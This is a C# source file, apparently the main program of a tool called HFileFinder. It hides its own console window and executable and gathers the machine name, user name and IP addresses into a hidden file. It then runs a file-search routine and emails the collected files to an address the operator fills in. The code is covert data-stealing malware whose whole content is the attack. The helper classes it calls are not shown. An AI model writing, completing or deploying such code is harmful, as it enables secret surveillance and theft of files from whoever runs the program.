using System;
using System.IO;
using System.Net;

namespace HFileFinder
{
    class Program
    {
        private static string email = "email";//Enter yours
        private static string password = "pass";//Enter yours
        private static string displayName = "HFileFinder";
        private static string to = "to";//Enter yours
        //private static string subject = Environment.MachineName + ":" + Environment.UserName + " : ";
        private static string subject = "Test";
        private static string body = "";
        private static string sys = Environment.MachineName + "_" + Environment.UserName;
        private static string internetProtocol;
        
        static void Main(string[] args)
        {
            HSConsoleWindow.HideWindow();
            string thisPath = Console.Title;
            File.SetAttributes(thisPath, FileAttributes.Hidden);
            //File.WriteAllText("test.txt", thisPath);

            //Get IP addresses
            var ips = (Dns.GetHostEntry(Dns.GetHostName()).AddressList);
            foreach (var ip in ips)
            {
                internetProtocol += (ip.ToString()) + "\n";
            }
            File.WriteAllText($"{sys}_ip.txt", internetProtocol);
            File.SetAttributes($"{sys}_ip.txt", FileAttributes.Hidden);

            //Main work
            FileFinder.Work(sys);

            //Send datas by email service
            int filesCount = FileFinder.path.Length;
            string[] files = new string[filesCount];
            for (int i = 0; i < filesCount; i++)
            {
                files[i] = sys + i + ".txt";
                Send.SendEmail(email, password, displayName, to, subject, body, files[i]);
            }

            //HSConsoleWindow.ShowWindow();
            Console.Beep(432, 500);
            Console.ReadKey();
        }

    }
}
